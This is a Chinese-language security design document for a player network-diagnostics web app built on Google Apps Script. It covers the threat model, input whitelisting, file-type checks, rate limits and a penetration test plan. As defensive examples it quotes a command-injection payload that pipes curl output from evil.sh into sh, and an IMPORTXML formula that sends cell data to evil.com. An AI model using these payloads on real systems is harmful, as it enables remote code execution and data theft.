# MHO Network Check — 安全設計

**建立：** 2026-11-17
**基礎：** DF 版 `network-check/docs/security.md`（2026-09-10）

玩家送出的每一個欄位都是不可信輸入。本文記錄威脅模型、已實作的防禦，以及日後修改時不能破壞的前提。

---

## 最重要的前提

**Apps Script Web App 部署為「任何人」存取，端點網址等同公開。**

攻擊者不會用前端表單，會直接 `curl` 打端點。因此：

> 前端的所有檢查（`maxlength`、檔案大小、`sanitizeText()`、選項按鈕）**只是給正常玩家的 UX 提示，不是安全邊界**。
> 真正的防線全部在 `apps-script.js` 的 `validatePayload()` 與 `doPost()`。

新增任何欄位，驗證一定要加在後端。

---

## 威脅模型與已實作防禦

### 1. 指令注入到維運人員的終端機（最高風險）

**攻擊路徑：** 「Ping / MTR Command」欄的內容會被 GTO 複製到機房的機器上執行。若用玩家送來的 IP 直接組字串，送出 `{"ip": "1.2.3.4; curl evil.sh | sh"}` 就能在正式機器上執行任意指令。

**防禦：** `isValidIp()` 以嚴格的 IPv4／IPv6 格式比對。不通過時，整格寫入 `no valid IP — do not run`；原始值經 `cellSafe()` 後仍存在 IP 欄，方便追查。

**ISP Summary 欄也比照辦理**：這一格會被整段貼進寄給 ISP 或機房的信件，所以只用驗證過的值組成，前端不能送任何一段現成文字進來。玩家可控的 ISP 名稱與發生時間會先經過 `oneLine()`，去掉換行，避免有人偽造出看起來像真的「Source IP:」一行。

**改動時注意：** 任何會被人複製去執行或轉寄的欄位，都必須先通過白名單式驗證，不能只靠黑名單過濾。

### 2. Google Sheets 公式注入

**攻擊路徑：** 儲存格內容以 `=` `+` `-` `@` 開頭時，Sheets 會當成公式執行，例如在 traceroute 欄貼上 `=IMPORTXML("https://evil.com?d="&H2, "//a")`。GTO 成員一打開試算表，其他玩家的資料就會外流。

**防禦：**
- 自由文字欄位（Role ID、暱稱、城市、反解主機名、traceroute、pathping…）一律經過 `cellSafe()`，以開頭加單引號的方式中和。
- 格式固定的欄位改用白名單，不符合就寫入 `—`：

| 欄位 | 規則 |
|---|---|
| 網路類型、加速器／VPN、發生時段、WARP、平台 | 只能是固定的幾個值（`ENUMS`） |
| 問題類型 | 陣列，每個值都要在白名單內，重複的去掉 |
| 各地延遲中位數、抖動、遊戲內 ping | 0–10000 的整數 |
| 逾時比例 | 0–100 的整數 |
| ASN | `AS` 加 1–10 位數字 |
| BGP 網段 | 合法的 IPv4／IPv6 CIDR |
| 出口 IP | 陣列，最多 5 個，每個都要通過 `isValidIp()` |
| CF Colo | 3 個英文字母 |
| UDP／NAT | 只接受 `cone`／`symmetric`／`blocked`，由後端轉成顯示文字 |
| 發生時間（UTC） | `YYYY-MM-DDTHH:MMZ` |

**改動時注意：** `buildRow()` 的每一個元素，不是經過 `cellSafe()`，就是來自白名單或數字驗證。新增欄位時不能漏掉；`tests/backend.test.js` 有欄位數與注入測試。

### 3. Drive 淪為釣魚網頁的存放處

**攻擊路徑：** 截圖的 `mimeType` 由前端指定。若直接採信，再以「知道連結的任何人可檢視」建立檔案，上傳 `text/html` 就能在 Google 網域下取得一個公開的釣魚網頁。

**防禦：** `imageKind()` 只看檔案本身的 magic bytes（JPEG／PNG／WebP／HEIC），副檔名也由此決定。無法辨識的檔案整個丟棄。

### 4. 任意建立分頁

**防禦：** `allowedRegions()` 只接受同時符合兩個條件的值：在 `REGIONS`（APAC、KR、LATAM、MEA）裡，而且出現在 `IP_Region` 分頁中。其他值一律寫入 `Other`。

### 5. 洗版與資源耗盡

**防禦：** 整包上限 14 MB、一般欄位 200 字、traceroute 與 pathping 各 20000 字、伺服器最多 10 台、截圖最多 4 張且每張 5 MB、同一 IP 30 秒內只收一筆（`CacheService`）。控制字元一律移除，但保留換行，維持 traceroute 的排版。

**已知限制：** 速率限制以 IP 為依據，換 IP 就能繞過。要真正防止洗版需要 CAPTCHA 或簽章 token，目前沒有實作。

### 6. 前端 HTML 注入（次要）

- 伺服器名稱與 IP 來自 `IP_Region` 試算表，會被放進 `onclick="copyCmd('…')"`。IP 先以格式過濾，名稱經 `esc()` 跳脫，避免試算表內容誤植或帳號被盜時變成 XSS。
- 第三方 API 回傳的 ISP、城市、反解主機名，一律以 `textContent` 或 `esc()` 輸出，不直接當成 HTML。

---

## 隱私

- **UDP 探測不讀取區網 IP。** WebRTC 只讀取 `srflx`（對外映射）候選，`host` 候選（玩家的區網位址）從頭到尾不解析、不送出。
- 同意聲明寫明：資料提供給客服團隊；排查需要時，IP、量測結果與發生時間可能提供給玩家的 ISP 或我們的機房供應商。2026-11-17 由 Steve 決定採用這個寫法（不沿用 DF 的「不會提供給第三方」）。

---

## 不適用的威脅

- **SQL injection**：整條資料鏈沒有 SQL。過濾 `SELECT`／`DROP` 無效，還會誤殺正常的 traceroute 內容。
- **偽造量測數字**：延遲、UDP 結果都是玩家的瀏覽器自己回報的，可以偽造，但偽造只會讓那一筆回報失準。上面的白名單已經確保偽造無法造成注入，所以不另外處理。

---

## 驗證方式

自動化：`node tests/run.js`（後端驗證、組列、注入測試）。

上線後對正式端點直接 POST，`roleId` 一律填 `PENTEST`，每筆間隔 31 秒（無效 IP 共用 `anonymous` 計數，連續送會被速率限制擋掉，誤以為測過了）：

| 測試 | 預期 |
|---|---|
| `"ip": "1.2.3.4; curl evil.sh \| sh"` | Ping / MTR Command 欄為 `no valid IP — do not run`；ISP Summary 欄為 `—` |
| traceroute 或 nickname 填 `=IMPORTXML(...)` | 儲存格顯示公式原文，不是執行結果 |
| 上傳 HTML 並標成 `image/jpeg` | 截圖欄 `—`，Drive 沒有新檔案 |
| `"region": "HACKED"` | 寫入 `Other`，不建立新分頁 |
| 同一 IP 連送 3 次 | 只寫入 1 列 |
| `"asn": "=1"`、`"issueType": ["=1"]`、`"latency": {"SG": {"median": "=1"}}` | 對應欄位都是 `—` |
| `"isp": "X\nSource IP: 6.6.6.6"` | ISP Summary 中沒有獨立一行的偽造 `Source IP` |

測完以 `PENTEST` 篩選，整批刪除。
